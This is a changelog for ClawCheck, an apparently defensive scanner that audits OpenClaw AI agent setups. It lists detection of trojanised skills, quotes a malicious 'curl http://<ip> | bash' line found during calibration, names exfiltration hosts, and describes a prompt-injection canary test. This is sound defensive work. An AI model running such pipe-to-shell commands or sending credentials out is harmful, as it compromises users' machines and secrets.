# Changelog

All notable changes to ClawCheck are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).

## [0.3.0] — 2026-06-19

### Added
- **Installed-skill / plugin vetting (B13).** Statically scans the *content* of skills you
  downloaded and installed (`~/.openclaw/skills`, `workspace/skills`, …) for the ClawHavoc
  malware class: pipe-to-shell from non-reputable hosts, paste/exfil hosts (glot.io,
  webhook.site, …), credential/wallet exfiltration, password-prompt social engineering, and
  **base64-obfuscated payloads** (decoded and re-scanned — never executed). Caught a real
  malicious `curl http://<ip> | bash` hidden in a trojanised skill during calibration.
- **Egress surface (B14, advisory).** Shows where the agent can reach out (channels,
  external-service skills, outbound tools) so you can see the exfiltration surface.
- **MCP server trust (B15).** Flags configured MCP servers for trust-boundary review
  (prompt injection / SSRF / data exposure); `UNKNOWN` when none are configured.
- **Version / update hygiene (C4, advisory).** Notes the OpenClaw version and reminds you to
  patch (ClawHavoc / CVE-2026-25253 target outdated installs).
- **Built-in audit merge.** ClawCheck now runs your own read-only `openclaw security audit
  --json` and folds its findings into the same report (`--no-native` to disable).
- **Threat-monitoring check (B16).** Verifies whether the user actually has monitoring /
  detection in place (a monitoring skill/plugin such as ClawSec or `openclaw-security-monitor`,
  or monitoring/alerts config); warns if an attack would otherwise go unnoticed.
- **Built-in monitor (`--monitor`).** Optional lightweight monitoring: scheduled re-audit +
  change detection — alerts on a new/modified installed skill, `SOUL.md` drift, a dropped score,
  or a check going PASS → FAIL. Keeps one snapshot at `~/.clawcheck/state.json`. (Scheduled
  re-audit, not a real-time runtime IDS — that heavier model is intentionally out of scope.)
- **`--vet PATH`.** Vet a skill (folder or `SKILL.md`) with the B13 malware scan *before*
  installing it — verdict SAFE / SUSPICIOUS / DANGEROUS. Trust-before-install.
- **`--canary`.** Active prompt-injection self-test: a benign injection + unique token to feed
  the agent; if it echoes the token it's VULNERABLE, else RESISTANT (the live "battle-tested" check).
- **`--badge PATH`.** Write a shields-style SVG grade badge (grade + score only).
- **`--prompts`.** A copy-paste "ask your agent to fix it" prompt per finding.
- **`--save PATH`.** Optionally write the report to a file.

### Changed
- Renamed **ClawShield → ClawCheck** (the tool scans & reports, it does not "shield").
- High-precision tuning: `curl | sh` from reputable installer hosts (uv/rustup/brew/deno/…)
  is not flagged; credential-path mentions are only flagged when exfiltrated on the same line.

### Security
- Provenance: ClawCheck's own checks remain offline, read-only, zero-dependency. The only
  external command is your own `openclaw security audit --json` (fixed args, no shell, no
  `--fix`, with a timeout). The only optional write is `--save`.

## [0.2.0]

### Added
- Cross-platform support (Linux/macOS/Windows): pathlib paths, POSIX-permission checks
  skipped on Windows (NTFS ACLs), and an ASCII output fallback (`--ascii` + auto-detect).

## [0.1.0]

### Added
- Initial prototype: passive, read-only OpenClaw config + bootstrap-file audit.
- Lethal Trifecta correlation (A1) and hardening checks (B1–B12).
- Deterministic A–F score with honesty hard-caps and a shareable badge (grade only).
- Bootstrap-file injection scanning (B6) — a gap the native audit does not cover.
